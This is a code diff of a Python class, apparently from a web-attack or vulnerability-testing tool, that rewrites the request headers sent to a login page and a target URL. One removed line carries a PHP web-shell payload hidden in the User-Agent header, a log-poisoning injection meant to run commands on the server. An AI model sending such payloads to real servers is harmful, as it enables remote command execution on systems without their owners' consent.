@@ -61,10 +61,15 @@ class Aggressiv :
                       request.set_handle_robots(False)
                       request.set_handle_redirect(True)
                       request.set_handle_refresh(True, max_time=1)
-                      request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                           ('username',f'{self.args.user}'.replace('\n','')),
-                                           ('password',f'{self.args.password}'),
-                                           ('Cookie',str(self.Cookie).replace('\n',''))]                     
+                      request.addheaders = [
+                                ("User-Agent", "curl/7.88.1"),
+                                ("Accept", "*/*"),
+                                ("Accept-Encoding", "identity"),
+                                ("Connection", "close"),
+                                ('Cookie',str(self.Cookie).replace('\n','')),
+                                ('username',f'{self.args.user}'),
+                                ('password',f'{self.args.password}')]
+                                                             
                       url_login = request.open(loginurl,timeout=5)    
                       try: 
                           request.select_form(nr = 0)
@@ -150,11 +155,14 @@ class Aggressiv :
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
                     request.set_handle_refresh(True, max_time=0)              
-                    request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?>(X11; U; Linux i686; en-US; rv:1.9.0.1)\
-                                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                 ('Cookie',str(self.Cookie).replace('\n','')),
-                                 ('username',f'{self.args.user}'),
-                                 ('password',f'{self.args.password}')]
+                    request.addheaders = [
+                                ("User-Agent", "curl/7.88.1"),
+                                ("Accept", "*/*"),
+                                ("Accept-Encoding", "identity"),
+                                ("Connection", "close"),
+                                ('Cookie',str(self.Cookie).replace('\n','')),
+                                ('username',f'{self.args.user}'),
+                                ('password',f'{self.args.password}')]
                     try:   
                         first_req = request.open(self.args.Vulnurl).read()   
                         self.Get_Oregnal_URL = request.open(self.url,timeout=6).read()
